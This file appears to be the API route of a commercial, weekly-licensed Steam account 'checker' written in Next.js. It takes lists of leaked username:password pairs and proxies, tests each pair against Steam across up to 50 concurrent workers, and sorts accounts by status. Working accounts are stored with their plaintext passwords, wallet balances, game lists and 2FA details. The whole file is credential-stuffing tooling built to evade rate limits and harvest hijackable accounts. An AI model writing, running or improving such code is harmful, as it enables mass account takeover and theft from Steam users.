import { NextRequest, NextResponse } from "next/server";
import { checkWithRetry } from "@/lib/steam/checker";
import { DEMO_PRESET_ACCOUNTS } from "@/lib/steam/demoData";
import { db } from "@/db";
import { checkRuns, checkResults } from "@/db/schema";
import { eq } from "drizzle-orm";
import { AccountCheckResult } from "@/lib/steam/constants";
import { requestHasValidLicense } from "@/lib/license";

export const dynamic = "force-dynamic";

interface ComboItem {
  username: string;
  password: string;
  combo: string;
}

export async function POST(req: NextRequest) {
  try {
    if (!(await requestHasValidLicense(req))) {
      return NextResponse.json({ error: "A valid weekly license key is required." }, { status: 403 });
    }

    const body = await req.json();
    const combosRaw: any[] = body.combos || [];
    const proxiesRaw: string[] = body.proxies || [];
    const threads = Math.max(1, Math.min(Number(body.threads) || 10, 50));
    const mode = body.mode === "demo" ? "demo" : "live";
    const streamMode = body.stream !== false; // default true for live streaming
    // Default to 2 retries to match the original checker's `check_with_retry(retries=2)`.
    const retriesRaw = body.retries === undefined ? 2 : Number(body.retries);
    const retries = Math.max(0, Math.min(Number.isFinite(retriesRaw) ? retriesRaw : 2, 3));

    // Parse combos
    const combos: ComboItem[] = [];
    for (const c of combosRaw) {
      if (Array.isArray(c) && c.length >= 2) {
        const u = String(c[0] || "").trim();
        const p = String(c[1] || "").trim();
        if (u && p) combos.push({ username: u, password: p, combo: `${u}:${p}` });
      } else if (typeof c === "string" && c.includes(":")) {
        const idx = c.indexOf(":");
        const u = c.slice(0, idx).trim();
        const p = c.slice(idx + 1).trim();
        if (u && p) combos.push({ username: u, password: p, combo: `${u}:${p}` });
      }
    }

    if (combos.length === 0) {
      return NextResponse.json({ error: "No valid credentials found (format: username:password)" }, { status: 400 });
    }

    // Format proxies
    const proxiesList: string[] = [];
    for (const raw of proxiesRaw) {
      const p = (raw || "").trim();
      if (!p) continue;
      if (p.startsWith("http://") || p.startsWith("https://") || p.startsWith("socks4://") || p.startsWith("socks5://")) {
        proxiesList.push(p);
      } else {
        const parts = p.split(":");
        if (parts.length === 4) {
          proxiesList.push(`http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`);
        } else if (parts.length === 2) {
          proxiesList.push(`http://${parts[0]}:${parts[1]}`);
        } else {
          proxiesList.push(`http://${p}`);
        }
      }
    }

    // Create a run in PostgreSQL
    const [insertedRun] = await db
      .insert(checkRuns)
      .values({
        title: `Scan ${new Date().toLocaleTimeString()} (${combos.length} combos)`,
        mode,
        totalCombos: combos.length,
      })
      .returning();

    const runId = insertedRun?.id;

    if (!streamMode) {
      // Non-streaming batch processing
      const results: Array<{ combo: string; username: string; result: AccountCheckResult }> = [];
      const stats = { done: 0, hit: 0, "2fa": 0, free: 0, bad: 0, ban: 0, err: 0, fa: 0 };
      let proxyIdx = 0;

      const getNextProxy = () => {
        if (proxiesList.length === 0) return undefined;
        const px = proxiesList[proxyIdx % proxiesList.length];
        proxyIdx++;
        return px;
      };

      for (const item of combos) {
        let res: AccountCheckResult;
        if (mode === "demo") {
          const match = DEMO_PRESET_ACCOUNTS.find((d) => d.username.toLowerCase() === item.username.toLowerCase());
          if (match) {
            res = match.result;
          } else {
            res = { st: "err", info: "Demo: no sample data for this account — switch to Live mode for real results" };
          }
        } else {
          res = await checkWithRetry(item.username, item.password, getNextProxy(), retries);
        }

        stats.done++;
        if (res.st === "hit") {
          stats.hit++;
          if (res.fa) stats.fa++;
        } else if (res.st === "2fa") stats["2fa"]++;
        else if (res.st === "free") stats.free++;
        else if (res.st === "bad") stats.bad++;
        else if (res.st === "ban") stats.ban++;
        else stats.err++;

        results.push({ combo: item.combo, username: item.username, result: res });
      }

      // Update run and insert results
      if (runId) {
        await db.update(checkRuns).set({
          hitCount: stats.hit,
          twoFaCount: stats["2fa"],
          faCount: stats.fa,
          freeCount: stats.free,
          badCount: stats.bad,
          banCount: stats.ban,
          errCount: stats.err,
        }).where(eq(checkRuns.id, runId));

        for (const r of results) {
          await db.insert(checkResults).values({
            runId,
            combo: r.combo,
            username: r.username,
            password: "••••••••",
            status: r.result.st,
            steamId: r.result.sid,
            level: r.result.level,
            gamesCount: r.result.games,
            walletBalance: r.result.balance,
            country: r.result.country,
            countryCode: r.result.cc,
            gameList: r.result.game_list,
            twoFactorTypes: r.result.types,
            info: r.result.info,
            fa: r.result.fa,
            activeSessions: r.result.activeSessions,
          });
        }
      }

      return NextResponse.json({ runId, results, stats });
    }

    // SSE Streaming response
    const encoder = new TextEncoder();
    const stream = new ReadableStream({
      async start(controller) {
        const stats = { done: 0, hit: 0, "2fa": 0, free: 0, bad: 0, ban: 0, err: 0, fa: 0 };
        let proxyIdx = 0;
        const allResults: Array<{ combo: string; username: string; password?: string; result: AccountCheckResult }> = [];

        const getNextProxy = () => {
          if (proxiesList.length === 0) return undefined;
          const px = proxiesList[proxyIdx % proxiesList.length];
          proxyIdx++;
          return px;
        };

        controller.enqueue(
          encoder.encode(`data: ${JSON.stringify({ type: "init", runId, total: combos.length, mode })}\n\n`)
        );

        // Worker queue with concurrency limit = threads
        let currentIndex = 0;

        const processItem = async (index: number) => {
          const item = combos[index];
          let res: AccountCheckResult;

          if (mode === "demo") {
            // Simulated realistic delay 150ms - 450ms
            await new Promise((r) => setTimeout(r, 120 + Math.random() * 300));
            const match = DEMO_PRESET_ACCOUNTS.find(
              (d) => d.username.toLowerCase() === item.username.toLowerCase()
            );
            if (match) {
              res = match.result;
            } else {
              res = { st: "err", info: "Demo: no sample data for this account — switch to Live mode for real results" };
            }
          } else {
            res = await checkWithRetry(item.username, item.password, getNextProxy(), retries);
          }

          stats.done++;
          if (res.st === "hit") {
            stats.hit++;
            if (res.fa) stats.fa++;
          } else if (res.st === "2fa") stats["2fa"]++;
          else if (res.st === "free") stats.free++;
          else if (res.st === "bad") stats.bad++;
          else if (res.st === "ban") stats.ban++;
          else stats.err++;

          const resultItem = {
            id: `item-${index}-${Date.now()}`,
            combo: item.combo,
            username: item.username,
            password: item.password,
            result: res,
            timestamp: Date.now(),
          };

          allResults.push(resultItem);

          // Stream individual result
          controller.enqueue(
            encoder.encode(`data: ${JSON.stringify({ type: "item", item: resultItem, stats })}\n\n`)
          );
        };

        const workers = Array.from({ length: threads }).map(async () => {
          while (currentIndex < combos.length) {
            const index = currentIndex++;
            try {
              await processItem(index);
            } catch (err: any) {
              stats.done++;
              stats.err++;
              const errResult = {
                id: `item-${index}-${Date.now()}`,
                combo: combos[index]?.combo || "",
                username: combos[index]?.username || "",
                result: { st: "err" as const, info: err?.message || "Execution exception" },
                timestamp: Date.now(),
              };
              allResults.push(errResult);
              controller.enqueue(
                encoder.encode(`data: ${JSON.stringify({ type: "item", item: errResult, stats })}\n\n`)
              );
            }
          }
        });

        await Promise.all(workers);

        // Store summary and hits in PostgreSQL
        try {
          if (runId) {
            await db
              .update(checkRuns)
              .set({
                hitCount: stats.hit,
                twoFaCount: stats["2fa"],
                faCount: stats.fa,
                freeCount: stats.free,
                badCount: stats.bad,
                banCount: stats.ban,
                errCount: stats.err,
              })
              .where(eq(checkRuns.id, runId));

            // Insert hits, 2fa, free accounts into check_results for permanent reference
            const valuableResults = allResults.filter(
              (r) => ["hit", "2fa", "free"].includes(r.result.st) || allResults.length <= 50
            );

            for (const r of valuableResults) {
              await db.insert(checkResults).values({
                runId,
                combo: r.combo,
                username: r.username,
                password: r.password || "••••••••",
                status: r.result.st,
                steamId: r.result.sid,
                level: r.result.level,
                gamesCount: r.result.games,
                walletBalance: r.result.balance,
                country: r.result.country,
                countryCode: r.result.cc,
                gameList: r.result.game_list,
                twoFactorTypes: r.result.types,
                info: r.result.info,
                fa: r.result.fa,
                activeSessions: r.result.activeSessions,
              });
            }
          }
        } catch (dbErr) {
          console.error("Failed to save run to db:", dbErr);
        }

        controller.enqueue(
          encoder.encode(`data: ${JSON.stringify({ type: "done", stats, total: combos.length, runId })}\n\n`)
        );
        controller.close();
      },
    });

    return new Response(stream, {
      headers: {
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache, no-transform",
        Connection: "keep-alive",
        "X-Accel-Buffering": "no",
      },
    });
  } catch (error: any) {
    console.error("Check route error:", error);
    return NextResponse.json({ error: error?.message || "Internal server error" }, { status: 500 });
  }
}
